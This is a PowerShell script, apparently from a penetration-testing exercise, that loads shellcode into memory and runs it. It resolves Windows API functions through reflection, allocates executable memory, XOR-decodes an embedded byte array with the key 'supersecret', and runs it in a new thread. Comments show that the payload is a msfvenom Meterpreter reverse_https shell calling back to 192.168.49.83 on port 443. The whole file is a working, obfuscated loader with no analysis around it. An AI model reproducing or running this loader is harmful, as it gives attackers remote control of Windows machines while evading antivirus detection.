function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object { 
            $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') 
        }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $tmp=@()
        $assem.GetMethods() | 
            ForEach-Object {
                If($_.Name -eq "GetProcAddress") {
                    $tmp+=$_}
                }
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

#msfvenom -p windows/meterpreter/reverse_https LPORT=443 HOST=192.168.49.83 EXITFUNC=thread -f ps1 
#msfvenom -p windows/x64/meterpreter/reverse_https LPORT=443 HOST=192.168.49.83 EXITFUNC=thread -f ps1
#[Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52

[Byte[]] $buf = 0x8f,0x3d,0xf3,0x81,0x82,0x9b,0xa9,0x63,0x72,0x65,0x35,0x22,0x34,0x20,0x37,0x3a,0x42,0xb7,0x6,0x3a,0xee,0x26,0x13,0x24,0x38,0xee,0x20,0x6b,0x33,0x2b,0xf9,0x37,0x54,0x3b,0xfe,0x2,0x35,0x3f,0x42,0xac,0x2b,0x7d,0xd2,0x3e,0x39,0x3d,0x41,0xa5,0xde,0x4f,0x4,0x1f,0x70,0x49,0x54,0x32,0xb4,0xb9,0x68,0x33,0x72,0xa4,0x81,0x9f,0x37,0x35,0x22,0x3d,0xfb,0x37,0x52,0xf8,0x27,0x5f,0x3a,0x64,0xa4,0x15,0xf4,0x8,0x7d,0x79,0x71,0x6a,0xe6,0x0,0x65,0x74,0x73,0xfe,0xf0,0xed,0x72,0x73,0x65,0x2b,0xf7,0xa5,0x0,0x14,0x3d,0x71,0xb5,0x36,0xf8,0x25,0x43,0x22,0xee,0x3c,0x6b,0x3c,0x71,0xb5,0x91,0x25,0x2d,0x9c,0xbb,0x24,0xff,0x47,0xfd,0x3d,0x54,0xbb,0x3b,0x64,0xb5,0x3a,0x54,0xb4,0xdf,0x34,0xb1,0xac,0x7f,0x32,0x64,0xa2,0x4a,0x85,0x1,0x82,0x39,0x73,0x29,0x56,0x7b,0x20,0x5a,0xa3,0x10,0xac,0x2b,0x31,0xfb,0x25,0x56,0x3a,0x64,0xb3,0x14,0x24,0xff,0x7f,0x3d,0x34,0xee,0x32,0x6f,0x2c,0x62,0xa2,0x24,0xff,0x77,0xfd,0x31,0x3d,0x33,0x2b,0x3b,0x2b,0x73,0xb5,0x2d,0x29,0x34,0x28,0x24,0x2b,0x32,0x3f,0x2b,0xf1,0x89,0x54,0x32,0x27,0x8f,0x85,0x2a,0x32,0x3c,0x39,0x3a,0xee,0x66,0x9a,0x3e,0x8f,0x9a,0x8d,0x2e,0x2d,0x52,0xa9,0x36,0x3d,0xcd,0x2,0x19,0xb,0x1b,0x1d,0x0,0x17,0x72,0x24,0x22,0x3b,0xfc,0x91,0x2c,0xb5,0xb1,0x29,0x14,0x54,0x62,0x8b,0xa6,0x26,0x23,0x2d,0xfb,0x92,0x36,0x39,0x3f,0x54,0xb4,0x3e,0x44,0xb9,0x36,0x21,0x3a,0xdf,0x59,0x24,0x1c,0xd3,0x73,0x75,0x70,0x65,0x8d,0xa6,0x8d,0x6f,0x72,0x65,0x74,0x42,0x45,0x5e,0x54,0x42,0x5d,0x54,0x57,0x5c,0x56,0x4d,0x73,0x2f,0x38,0xec,0xb3,0x3a,0xa2,0xa3,0xc9,0x64,0x74,0x73,0x38,0x41,0xac,0x21,0x20,0xf,0x60,0x21,0x2c,0xce,0x24,0xfc,0xef,0xa3,0x72,0x73,0x65,0x63,0x8d,0xb0,0x9c,0xc,0x75,0x70,0x65,0x5d,0x26,0x2f,0x24,0x2a,0x1,0x26,0x42,0x14,0x27,0x23,0x1a,0x44,0x0,0x2b,0x2,0x53,0x33,0x1b,0x18,0x3,0xb,0x15,0x38,0x21,0x33,0x30,0xf,0x2b,0x40,0x18,0x14,0x52,0x3,0x2c,0x22,0x2f,0x3e,0x2e,0x2c,0x23,0x21,0x25,0x1,0x3b,0x37,0x6,0x1b,0x46,0x53,0x30,0x27,0x20,0x6,0x36,0x3e,0x29,0x31,0x26,0x17,0x27,0x3a,0x42,0x4c,0x15,0x11,0x0,0x23,0x1f,0x30,0x34,0x24,0x2c,0x1d,0x34,0x2a,0x9,0x36,0x2a,0x53,0x3c,0x21,0x11,0x20,0x47,0x2d,0x13,0x48,0x26,0x19,0x36,0x51,0x19,0x29,0x45,0x11,0xf,0x1a,0x9,0x1d,0x12,0x56,0x33,0x2a,0x23,0x17,0x10,0x4c,0x2f,0xa,0x5,0x19,0x37,0x14,0x41,0x51,0x1b,0x25,0x3f,0x3d,0x50,0x34,0x35,0xa,0x39,0x40,0x65,0x3c,0xfa,0xb4,0x23,0x3f,0x33,0x2b,0x28,0x52,0xbb,0x36,0x3c,0xcb,0x75,0x42,0xcd,0xf6,0x73,0x65,0x63,0x72,0x35,0x27,0x20,0x3c,0xb7,0xa7,0x99,0x26,0x4b,0x58,0x8d,0xb0,0x3c,0xfa,0xb3,0x1a,0x6f,0x2d,0x3b,0xec,0x92,0x18,0x7a,0x2e,0x21,0x1d,0xf0,0x56,0x72,0x73,0x2c,0xea,0x92,0xf,0x70,0x32,0x2c,0x39,0xdf,0x7,0x35,0xfb,0xe5,0x72,0x65,0x74,0x73,0x8a,0xa5,0x28,0x43,0xb3,0x36,0x39,0x3a,0xec,0x85,0x3e,0x44,0xb9,0x28,0x43,0xba,0x36,0x30,0x3b,0xa2,0xb6,0x5e,0x73,0x68,0x1e,0x8d,0xa6,0xe0,0xa3,0x7,0x7a,0x3c,0xb4,0xb4,0xf8,0x76,0x72,0x73,0x2c,0xd9,0x36,0x95,0x41,0x93,0x75,0x70,0x65,0x72,0x8c,0xb0,0x2b,0x8d,0xaa,0x0,0x71,0x9e,0xda,0x8d,0x27,0x73,0x65,0x63,0x21,0x3c,0x1e,0x33,0x2f,0x39,0xec,0xa3,0xb2,0x87,0x73,0x3b,0xa2,0xb4,0x73,0x65,0x70,0x65,0x3b,0xc9,0x3d,0xc7,0x21,0x80,0x74,0x73,0x75,0x70,0x9a,0xa7,0x3b,0xf6,0x30,0x21,0x2d,0xfd,0x94,0x3d,0xf9,0x94,0x3a,0xfa,0xbf,0x2a,0xb5,0xa5,0x74,0x53,0x75,0x70,0x2c,0xfb,0x8a,0x2c,0xd9,0x60,0xf3,0xfd,0x91,0x75,0x70,0x65,0x72,0x8c,0xb0,0x2b,0xf1,0xa1,0x54,0xf6,0xb5,0x4,0xd7,0x14,0xf8,0x62,0x2b,0x73,0xa6,0xf1,0xb3,0x0,0xa2,0x3d,0xb1,0x2b,0xf,0x63,0x2b,0x2c,0xb3,0xb1,0x85,0xc5,0xc7,0x24,0x8c,0xb0
$string="supersecret";$newBytes = @();for ($i = 0; $i -lt $buf.Count; $i++) {$newBytes += $buf[$i] -bxor $string[$i % $string.Length];} $buf = $newBytes;



[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)


$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
